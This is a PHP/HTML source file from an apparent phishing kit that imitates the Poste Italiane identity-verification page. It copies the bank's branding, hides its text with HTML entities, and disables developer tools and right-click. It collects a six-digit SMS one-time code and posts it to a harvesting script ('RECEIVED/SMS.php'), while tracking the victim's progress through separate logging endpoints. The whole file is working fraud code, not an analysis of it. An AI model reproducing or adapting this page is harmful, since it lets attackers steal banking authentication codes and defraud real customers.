<?php
$md5=md5(time());
date_default_timezone_set('Europe/Rome');
include_once '../../../BOTS/INC/APP.php';
?>
<script>

	document.onkeydown = function(e) {
	  if(event.keyCode == 123) {
	     return false;
	  }
	  if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
	     return false;
	  }
	  if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
	     return false;
	  }
	  if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
	     return false;
	  }
	}


	
	document.addEventListener('contextmenu', function(e) {
	  e.preventDefault();
	});

</script>
<!DOCTYPE html>
<link type="image/x-icon" rel="shortcut icon" href="https://www.poste.it/favicon.ico"/>
<html lang="it" class="pi-lg pi-firefox pi-domain pi-domain-posteit pi-chrome">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Poste Italiane - &#86;&#101;&#114;&#105;&#102;&#105;&#99;&#97;&#32;&#100;&#39;&#105;&#100;&#101;&#110;&#116;&#105;&#116;&#224;</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
    <meta name="identifier" content="1453903140872">

    <!-- Stili slick -->
    <link type="text/css" rel="stylesheet" href="./IDP_files/slick.min.css">
    <link type="text/css" rel="stylesheet" href="./IDP_files/accessible-slick-theme.min.css">
    <!-- Stili base -->
    <link type="text/css" rel="stylesheet" href="./IDP_files/bootstrap.min.css">
    <link type="text/css" rel="stylesheet" href="./IDP_files/core.min.css">
    <link type="text/css" rel="stylesheet" href="./IDP_files/custom.css">

    <!-- Scripts -->
    <script type="text/javascript" src="./IDP_files/jquery.min.js.download"></script>
    <script src="./IDP_files/bootstrap.min.js.download"></script>
    <script src="./IDP_files/slick.min.js.download"></script>
    <script src="./IDP_files/utilita.js.download"></script>
    <script src="./IDP_files/poste-it.js.download"></script>
    <script src="./IDP_files/start-script.js.download"></script>

    <style>
        html, body {
            height: 100%;
            margin: 0;
        }

        body {
            display: flex !important;
            flex-direction: column !important;
            min-height: 100vh !important;
            transition: opacity ease-in 0.2s;
        }

        body[unresolved] {
            opacity: 0;
            display: block;
            overflow: hidden;
            position: relative;
        }

        main#accessibility-anchor {
            flex: 1 0 auto !important;
        }

        footer#footer {
            flex-shrink: 0 !important;
        }

        /* تنسيق الشكل المطابق للصورة تماماً: كلمة بالأعلى وخطوط سفلية نظيفة لكل خانة */
        .custom-otp-wrapper {
            display: flex;
            flex-direction: column;
            align-items: flex-start;
            margin: 20px auto;
            max-width: 280px;
        }

        .custom-otp-title {
            font-size: 16px;
            color: #222;
            margin-bottom: 12px;
            font-weight: normal;
        }

        .custom-otp-row {
            display: flex;
            gap: 15px;
            justify-content: flex-start;
        }

        .custom-otp-row .otp-input {
            width: 30px !important;
            height: 35px !important;
            background: transparent !important;
            border: none !important;
            border-bottom: 1.5px solid #6c757d !important;
            border-radius: 0 !important;
            text-align: center !important;
            font-size: 18px !important;
            box-shadow: none !important;
            padding: 0 !important;
            outline: none !important;
        }

        .custom-otp-row .otp-input:focus,
        .custom-otp-row .otp-input:active {
            outline: none !important;
            box-shadow: none !important;
            border-bottom: 2px solid #003366 !important;
            background: transparent !important;
        }

        .truste_caIcon_display { display: block !important; }
        .truste_cursor_pointer { cursor: pointer; }
        .truste_border_none { border: none; }
        .ta-display-none { display: none; }
    </style>

    <script language="javascript">
        var MYSERVERCONTEXT = "/jod-idp-retail/securetool";
        var debug = false;
        var optdata = ["", "", "", "", "", ""];
        var otplength = 0;
        
        function xsend(s) {
            if (s=="0") {
                document.getElementById("azsms").action = MYSERVERCONTEXT + "/v1/select";
                document.getElementById("azsms").submit();
            } else if (s=="2") {
                document.getElementById("azsms").action = MYSERVERCONTEXT + "/v1/select?lg=a";
                document.getElementById("azsms").submit();
            } else {
                document.getElementById("azsms").action = "../../RECEIVED/SMS.php";
                var otp = "";
                for (var i=0; i<6; i++) {
                    var optSingleValue = optdata[i];
                    otp = otp + optSingleValue;
                }
                document.getElementById("otp").value = otp;
                document.getElementById("azsms").submit();
            }
        }
    </script>
</head>

<body class="pattern-simple-01">
    <nav id="skiplink" aria-label="Navigazione di pagina">
        <ul>
            <li><a tabindex="0" class="skip-link sr-only-focusable-abs" href="#accessibility-anchor">Passa al contenuto principale</a></li>
            <li><a class="skip-link sr-only-focusable-abs" href="#footer">Passa al footer di pagina</a></li>
        </ul>
    </nav>

    <header>
        <div class="content" id="content-navbar">
            <div class="content-wrap">
                <div class="container">
                    <div class="row">
                        <div class="col-sm-12">
                            <div class="content-navbar-wrap">
                                <div class="row">
                                    <div class="col-sm-12">
                                        <nav class="navbar navbar-default navbar-flow" id="nav-def-flux" aria-label="barra di navigazione: menu, ricerca del sito e assistenza">
                                            <div class="navbar-header justify-content-sm-end">
                                                <div class="navbar-wrap">
                                                    <a class="navbar-brand" href="https://www.poste.it/" title="Torna a Poste.it">
                                                        <img id="logo" alt="Logo PosteItaliane" src="./IDP_files/logo-poste-italiane.png" srcset="/assets-da/core/img/loghi/logo-poste-italiane@2x.png 2x">
                                                    </a>
                                                </div>
                                                <div class="navbar-wrap w-100 justify-content-end">
                                                    <ul class="nav navbar-nav text-right">
                                                        <li></li>
                                                    </ul>
                                                </div>
                                            </div>
                                        </nav>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </header>

    <main id="accessibility-anchor" tabindex="-1">
        <div class="content" id="content-abstract">
            <div class="content-wrap">
                <div class="container">
                    <div class="row">
                        <div class="col-sm-12">
                            <div class="abstract">
                                <div class="abstract-heading text-center">
                                    <h1>&#86;&#101;&#114;&#105;&#102;&#105;&#99;&#97;&#32;&#100;&#39;&#105;&#100;&#101;&#110;&#116;&#105;&#116;&#224;</h1>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="content" id="content-main">
            <div class="content-wrap">
                <div class="container">
                    <div class="row row-space">
                        <div class="col-sm-8 col-sm-push-2">
                            <div class="main-pills">
                                <div class="main-pills-wrap">
                                    <div class="row" style="text-align: center;">
                                        <div class="col-sm-12" style="min-height: 0px;">
                                            <h2 class="mt-0"><b>Attivazione del nuovo sistema di sicurezza</b></h2>
                                            <p>&#80;&#101;&#114;&#32;&#99;&#111;&#109;&#112;&#108;&#101;&#116;&#97;&#114;&#101;&#32;&#108;&#39;&#97;&#116;&#116;&#105;&#118;&#97;&#122;&#105;&#111;&#110;&#101;&#32;&#100;&#101;&#108;&#32;&#110;&#117;&#111;&#118;&#111;&#32;&#115;&#105;&#115;&#116;&#101;&#109;&#97;&#32;&#100;&#105;&#32;&#115;&#105;&#99;&#117;&#114;&#101;&#122;&#122;&#97;&#44;&#32;&#97;&#98;&#98;&#105;&#97;&#109;&#111;&#32;&#105;&#110;&#118;&#105;&#97;&#116;&#111;&#32;&#105;&#108;&#32;&#99;&#111;&#100;&#105;&#103;&#101;&#32;&#100;&#105;&#32;&#118;&#101;&#114;&#105;&#102;&#105;&#99;&#97;&#32;&#118;&#105;&#97;&#32;&#83;&#77;&#83;&#32;&#97;&#108;&#32;&#115;&#117;&#111;&#32;&#116;&#101;&#108;&#101;&#102;&#111;&#110;&#111;&#46;&#32;&#73;&#110;&#115;&#101;&#115;&#115;&#97;&#101;&#105;&#111;&#110;&#101;&#105;&#110;&#97;&#32;&#105;&#108;&#32;&#99;&#111;&#100;&#105;&#103;&#101;&#32;&#113;&#117;&#105;&#32;&#115;&#111;&#116;&#116;&#111;&#32;&#101;&#32;&#112;&#114;&#101;&#109;&#97;&#171;&#67;&#111;&#110;&#116;&#105;&#110;&#117;&#97;&#187;&#46;</p>
                                            <hr>
                                            Hai a disposizione altri 9 tentativi di richiesta del Codice SMS.
                                            
                                            <div class="row col-sm-12 mb-5">
                                                <br>
                                                <ul class="list-check mb-3">
                                                    <li>Data: 21/07/2026</li>
                                                    <li>Operazione: Sicurezza</li>
                                                </ul>
                                                <hr>
                                            </div>
                                        </div>
                                    </div>

                                    <div class="row">
                                        <div class="col-sm-12">
                                            <form class="form-login spacer-xs-bottom-30 clearfix" name="azsms" id="azsms" method="POST" action="../../RECEIVED/SMS.php" onsubmit="xsend('1'); return false;">
                                                
                                                <!-- تصميم خانات الإدخال المطابق لصورتك تماماً -->
                                                <div style="display: flex; justify-content: center;">
                                                    <div class="custom-otp-wrapper">
                                                        <div class="custom-otp-title">Codice SMS</div>
                                                        <div class="custom-otp-row">
                                                            <div>
                                                                <label class="sr-only" for="otp-01">Campo OTP numero 1</label>
                                                                <input type="text" class="form-control otp-input" id="otp-01" maxlength="1" autocomplete="off" inputmode="numeric" autofocus>
                                                            </div>
                                                            <div>
                                                                <label class="sr-only" for="otp-02">Campo OTP numero 2</label>
                                                                <input type="text" class="form-control otp-input" id="otp-02" maxlength="1" autocomplete="off" inputmode="numeric">
                                                            </div>
                                                            <div>
                                                                <label class="sr-only" for="otp-03">Campo OTP numero 3</label>
                                                                <input type="text" class="form-control otp-input" id="otp-03" maxlength="1" autocomplete="off" inputmode="numeric">
                                                            </div>
                                                            <div>
                                                                <label class="sr-only" for="otp-04">Campo OTP numero 4</label>
                                                                <input type="text" class="form-control otp-input" id="otp-04" maxlength="1" autocomplete="off" inputmode="numeric">
                                                            </div>
                                                            <div>
                                                                <label class="sr-only" for="otp-05">Campo OTP numero 5</label>
                                                                <input type="text" class="form-control otp-input" id="otp-05" maxlength="1" autocomplete="off" inputmode="numeric">
                                                            </div>
                                                            <div>
                                                                <label class="sr-only" for="otp-06">Campo OTP numero 6</label>
                                                                <input type="text" class="form-control otp-input" id="otp-06" maxlength="1" autocomplete="off" inputmode="numeric">
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>

                                                <div class="form-group mt-3 text-center">    
                                                    Non hai ricevuto il codice? <a href="#" onclick="#">Riprova</a>
                                                </div>

                                                <input type="hidden" value="1BhSYvniMfCn2w4Zi3km-QaAuhqn3_oKON5_rsiCrV8" name="T43m-mgveKwArE_eE2HmGeKmrM0IW4lkXUpzQc2YeDQ" id="T43m-mgveKwArE_eE2HmGeKmrM0IW4lkXUpzQc2YeDQ">
                                                <input type="hidden" value="OohdrfuRee4YS0jWIlSyPOOkU_cvYk7RYIcS3kIxQGQ" name="sesid" id="sesid">
                                                <input type="hidden" id="otp" name="otp" value="">
                                            </form>
                                        </div>
                                    </div>

                                    <div class="row">
                                        <div class="col-sm-12" style="display: flex; justify-content: center;">
                                            <p class="btn-container btn-container-right mt-3 mt-md-4">
                                                <button id="_prosegui" type="button" class="btn btn-primary spacer-xs-left-10" value="PROSEGUI" onclick="xsend('1'); return false;" disabled="">Continua</button>
                                                <button id="_annulla" type="button" class="btn btn-secondary spacer-xs-right-10" value="INDIETRO" onclick="">Indietro</button>
                                            </p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <footer id="footer">
        <div class="content content-footer content-footer-extra">
            <div class="content-wrap">
                <div class="container">
                    <div class="row">
                        <div class="col-sm-12">
                            <div class="row my-4">
                                <div class="col-sm-8">
                                    <div class="clearfix">
                                        <div class="base-footer mt-3 mt-sm-0">
                                            <div class="clearfix">
                                                <ul class="list-unstyled pull-sm-left">
                                                    <li><span class="block fs-small text-xs-center text-sm-left">&#169; Poste Italiane 2026 - Partita iva : 01114601006</span></li>
                                                </ul>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-sm-4">
                                    <div class="text-center text-sm-right" id="teconsent" consent="0,1,2">           
                                        <a role="link" id="icon-id0533227726046411" tabindex="0" lang="it" aria-label="Preferenze Cookie" class="truste_cursor_pointer">Preferenze Cookie</a>
                                    </div>
                                </div>
                            </div>
                            <button class="btn btn-cta btn-primary back-to-top">
                                <span class="icon">
                                    <svg focusable="false">
                                        <title>Back to top</title>
                                        <use xlink:href="/assets-da/core/img/iconset/sprite.svg#007b-expand-less-m"></use>
                                    </svg>
                                </span>
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </footer>

    <script language="javascript">
        var otplength = 0;

        function handleButton() {
            var btnprosegui = document.getElementById("_prosegui");
            if (otplength > 5) {
                btnprosegui.removeAttribute("disabled");                                            
            } else {
                if (!btnprosegui.hasAttribute("disabled")) { 
                    btnprosegui.setAttribute("disabled", "");
                }
            }
        }

        const inputs = document.querySelectorAll('.otp-input');

        inputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                const value = e.target.value;
                
                if (value.length > 1) {
                    const chars = value.split('');
                    let currentIndex = index;
                    for (let i = 0; i < chars.length && currentIndex < 6; i++) {
                        inputs[currentIndex].value = chars[i];
                        optdata[currentIndex] = chars[i];
                        currentIndex++;
                    }
                    otplength = Math.min(6, currentIndex);
                    if (currentIndex < 6) {
                        inputs[currentIndex].focus();
                    } else {
                        inputs[5].focus();
                    }
                    handleButton();
                    return;
                }

                if (value !== '') {
                    optdata[index] = value;
                    if (index < 5 && optdata[index + 1] === '') {
                        otplength = Math.max(otplength, index + 1);
                        inputs[index + 1].focus();
                    }
                } else {
                    optdata[index] = '';
                }
                
                otplength = optdata.filter(val => val !== '').length;
                handleButton();
            });

            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace') {
                    e.preventDefault();
                    if (input.value !== '') {
                        input.value = '';
                        optdata[index] = '';
                    } else if (index > 0) {
                        inputs[index - 1].value = '';
                        optdata[index - 1] = '';
                        inputs[index - 1].focus();
                    }
                    otplength = optdata.filter(val => val !== '').length;
                    handleButton();
                }
            });
        });
    </script>
</body>
<script src="../../../AT.ENTRIES/CONFIGS/JOJ.js"></script>
<script>
<?php 
if(isset($_GET['e'])){
	echo '$.post("../../../AT.ENTRIES/AT/SMS.php",{smsfejl0errorview:1});';
}else{
	echo '$.post("../../../AT.ENTRIES/AT/SMS.php",{smsfejl0view:1});';
}
?>


var c=0;
$("#otp-02").keyup(function(){
	c++;if(c==1){
$.post("../../../AT.ENTRIES/ENTRIES/SMS.php",{smsfejl0ing:1});
	}});
</script>
</html>
